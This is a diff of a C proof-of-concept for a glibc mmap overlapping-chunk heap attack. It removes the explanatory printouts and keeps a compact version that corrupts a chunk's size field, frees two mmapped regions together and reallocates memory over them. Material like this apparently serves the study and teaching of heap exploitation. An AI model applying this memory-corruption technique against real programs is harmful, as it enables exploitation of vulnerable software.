@@ -39,73 +39,26 @@ This PoC demonstrates the attack by corrupting the size of one large chunk to en
 
 int main()
 {
-	int* ptr1 = malloc(0x10);
-
-	printf("This is performing an overlapping chunk attack but on extremely large chunks (mmap chunks).\n");
-	printf("Extremely large chunks are special because they are allocated in their own mmaped section\n");
-	printf("of memory, instead of being put onto the normal heap.\n");
-	puts("=======================================================\n");
-	printf("Allocating three extremely large heap chunks of size 0x100000 \n\n");
+	malloc(0x10);
 
 	long long* top_ptr = malloc(0x100000);
-	printf("The first mmap chunk goes directly above LibC: %p\n",top_ptr);
-
-	// After this, all chunks are allocated downwards in memory towards the heap.
 	long long* mmap_chunk_2 = malloc(0x100000);
-	printf("The second mmap chunk goes below LibC: %p\n", mmap_chunk_2);
-
 	long long* mmap_chunk_3 = malloc(0x100000);
-	printf("The third mmap chunk goes below the second mmap chunk: %p\n", mmap_chunk_3);
 
-	printf("\nCurrent System Memory Layout \n" \
-"================================================\n" \
-"running program\n" \
-"heap\n" \
-"....\n" \
-"third mmap chunk\n" \
-"second mmap chunk\n" \
-"LibC\n" \
-"....\n" \
-"ld\n" \
-"first mmap chunk\n"
-"===============================================\n\n"
-);
-
-	printf("Prev Size of third mmap chunk: 0x%llx\n", mmap_chunk_3[-2]);
-	printf("Size of third mmap chunk: 0x%llx\n\n", mmap_chunk_3[-1]);
-
-	printf("Change the size of the third mmap chunk to overlap with the second mmap chunk\n");
-	printf("This will cause both chunks to be Munmapped and given back to the system\n");
-	printf("This is where the vulnerability occurs; corrupting the size or prev_size of a chunk\n");
-
-	// VULNERABILITY: Corrupt the size of chunk 3 to include the region of chunk 2.
-	// We mask the mmap bits (& ~0x2) to perform math on the size and then restore the IS_MMAPPED bit (| 2).
+	// VULNERABILITY: Corrupt mmap size to overlap chunks
 	mmap_chunk_3[-1] = (0xFFFFFFFFFD & mmap_chunk_3[-1]) + (0xFFFFFFFFFD & mmap_chunk_2[-1]) | 2;
 
-	printf("New size of third mmap chunk: 0x%llx\n", mmap_chunk_3[-1]);
-	printf("Free the third mmap chunk, which munmaps the second and third chunks\n\n");
-
-	// This call triggers munmap on the combined size, releasing BOTH regions.
+	// Munmaps both regions
 	free(mmap_chunk_3);
 
-	printf("Get a very large chunk from malloc to get mmapped chunk\n");
-	printf("This should overlap over the previously munmapped/freed chunks\n");
-
-	// Allocate a size large enough to cover the released range.
+	// Reclaim released virtual memory
 	long long* overlapping_chunk = malloc(0x300000);
-	printf("Overlapped chunk Ptr: %p\n", overlapping_chunk);
 
-	// The memory at mmap_chunk_2 is now part of overlapping_chunk.
 	int distance = mmap_chunk_2 - overlapping_chunk;
-
-	// Set the value via the new pointer.
 	overlapping_chunk[distance] = 0x1122334455667788;
 
-	// The old pointer now reflects the change!
-	printf("Second chunk value (after write via new pointer): 0x%llx\n", mmap_chunk_2[0]);
 	assert(mmap_chunk_2[0] == overlapping_chunk[distance]);
-
-	_exit(0);
+	return 0;
 }
 ```
 
